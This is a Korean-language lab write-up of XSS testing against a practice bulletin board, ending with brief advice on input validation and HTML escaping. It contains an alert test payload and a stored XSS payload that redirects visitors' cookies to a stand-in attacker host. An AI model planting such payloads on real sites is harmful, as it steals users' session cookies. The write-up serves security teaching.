# XSS 모의해킹
 XSS(Cross-Site Scripting) 공격은 악의적인 스크립트를 삽입하여, 해당 웹 사이트의 사용자들이 스크립트를 실행하도록 유도하는 공격입니다.   
 이번 모의해킹에서는 공격자가 악의적인 스크립트를 삽입하여, 해당 웹 사이트에 접속한 사용자들에게 XSS 공격을 수행하는 방법을 다루었습니다.
 
 ## 게시판
 ![게시판 사진](https://github.com/Tree1st/HK/blob/master/webH/image/xss/xss_board.png)
 ![게시글 보기 사진](https://github.com/Tree1st/HK/blob/master/webH/image/xss/xss_view.png)
 해당 웹페이지에서는 게시글을 쓸 수 있으며, 게시글을 클릭하면 게시글을 볼 수 있는 화면이 구현되어있습니다.
 
 ## 공격 실습
 ![xss_test](https://github.com/Tree1st/HK/blob/master/webH/image/xss/XSS_test.png)
 
 현재 웹페이지가 XSS 공격에 취약한지 알아보기 위하여 게시글에 `<script>alert(document.cookie)</script>` 를 입력해 봅니다.
 
 ![xss_test2](https://github.com/Tree1st/HK/blob/master/webH/image/xss/XSS_test2.png)
 
 업로드된 게시글을 클릭하면 다음과같이 현재 사용자의 쿠키가 alert로 뜨는것을 확인 할 수 있습니다. 이는 해당 웹페이지가 XSS 공격에 취약하여 공격이 성공하였음을 알 수 있습니다.
 
 ## Stored XSS
 Stored XSS 공격은 공격자가 웹 사이트에 악성 스크립트를 저장해 놓고, 이를 웹 사이트에 접속한 모든 사용자들이 실행하도록 유도하는 공격입니다.
 
 ![xss_stored](https://github.com/Tree1st/HK/blob/master/webH/image/xss/xss_stored.png)
 
 게시글에 다음과같이 입력합니다.`<script>document.location="http://attacker.ip/?"+document.cookie;</script>` 해당 스크립트는 이 글을 접속하는 유저의 쿠키와 함께 공격자의 서버로 redirect 시킵니다.
 
 ![xss_stored2](https://github.com/Tree1st/HK/blob/master/webH/image/xss/xss_stored2.png)
 
 게시글에 접속하면 공격자의 웹서버로 redirection 되는것을 확인 할 수 있습니다.
 
 ![xss_stored3](https://github.com/Tree1st/HK/blob/master/webH/image/xss/xss_stored3.png)
 
 공격자의 웹서버 로그에서 사용자의 쿠키를 확인 할 수 있습니다.

## 방어 기법
 1. 입력값 검증: 모든 입력값에 대해서 적절한 검증을 통해 유효한 값만을 받아들이고, 악성 스크립트 등을 필터링하여 처리합니다.

 2. HTML 특수 문자 이스케이프: 입력값이 출력되는 곳에서 문자열을 안전한 HTML 형식으로 변환합니다.
